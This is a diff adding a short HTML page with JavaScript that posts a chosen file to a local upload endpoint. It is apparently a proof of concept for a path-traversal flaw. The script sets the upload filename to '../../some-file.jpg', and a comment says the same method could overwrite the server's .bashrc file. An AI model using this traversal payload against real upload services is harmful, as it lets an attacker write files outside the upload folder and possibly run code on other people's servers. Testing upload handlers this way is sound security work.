@@ -1,0 +1,23 @@
+File: <input id="image" name="image" type="file" />
+      <input id="submit" type="submit" name="submitBtn" value="Upload" />
+
+<script>
+var fileInputElement = document.getElementById("image")
+var submit = document.getElementById("submit")
+
+submit.addEventListener("click", function(){
+	var formData = new FormData();
+
+	// THE KEY IS HERE, you can go to ../../.bashrc to change their bashrc file
+	var filename = "../../some-file.jpg"
+	// HTML file input, chosen by user
+	formData.append("image", fileInputElement.files[0], filename);
+
+	var request = new XMLHttpRequest();
+	request.open("POST", "http://localhost:8080/upload");
+	request.send(formData);
+
+	alert("success send")
+}); 
+
+</script>
